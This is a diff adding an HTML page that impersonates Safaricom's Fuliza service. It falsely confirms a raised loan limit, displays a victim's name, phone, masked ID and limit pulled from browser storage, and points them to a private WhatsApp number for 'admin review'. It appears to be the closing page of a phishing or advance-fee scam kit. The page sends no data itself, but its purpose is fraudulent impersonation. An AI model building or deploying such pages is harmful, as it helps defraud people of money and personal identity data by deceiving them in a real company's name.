@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fuliza Limit Increased</title>
+<style>
+body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;color:#333;}
+.top-bar{background:#1fb141;color:white;padding:12px;text-align:center;font-weight:bold;font-size:18px;}
+.container{max-width:500px;margin:50px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center;}
+h2{color:#1fb141;}
+.user-info{margin:20px 0;text-align:left;}
+.user-info div{margin:10px 0;font-size:16px;}
+.limit-box{background:#1fb141;color:white;padding:10px 15px;border-radius:8px;font-weight:bold;margin-top:15px;display:inline-block;}
+.whatsapp-btn{margin-top:25px;display:inline-block;background:#25d366;color:white;padding:12px 25px;border-radius:30px;text-decoration:none;font-weight:bold;font-size:16px;}
+.whatsapp-btn:hover{background:#1ebe5d;}
+.footer{margin-top:40px;font-size:14px;color:#666;text-align:center;}
+</style>
+</head>
+<body>
+
+<header class="top-bar">Safaricom Fuliza Increase</header>
+
+<div class="container">
+<h2>🎉 Congratulations!</h2>
+<p>Your Fuliza limit has been successfully increased.</p>
+
+<div class="user-info">
+<div><b>Name:</b> <span id="userName">-</span></div>
+<div><b>Phone:</b> <span id="userPhone">-</span></div>
+<div><b>ID:</b> <span id="userID">-</span></div>
+<div class="limit-box">New Fuliza Limit: <span id="userLimit">-</span></div>
+</div>
+
+<p>Thank you for completing all steps. Your new limit is now active and will reflect automatically in your account within 48 hours.</p>
+
+<a class="whatsapp-btn" href="https://wa.me/254734997914" target="_blank">Contact Admin for Review</a>
+
+<div class="footer">
+© 2026 Safaricom Fuliza Increase
+</div>
+</div>
+
+<script>
+const name = localStorage.getItem("userName");
+const phone = localStorage.getItem("userPhone");
+const id = localStorage.getItem("userID");
+const limit = localStorage.getItem("currentLimit");
+
+document.getElementById("userName").innerText = name || "-";
+document.getElementById("userPhone").innerText = phone || "-";
+document.getElementById("userLimit").innerText = limit ? "KSh " + limit : "-";
+
+if(id){
+  const first = id.substring(0,2);
+  const last = id.substring(id.length-2);
+  document.getElementById("userID").innerText = first + "****" + last;
+}
+</script>
+
+</body>
+</html>
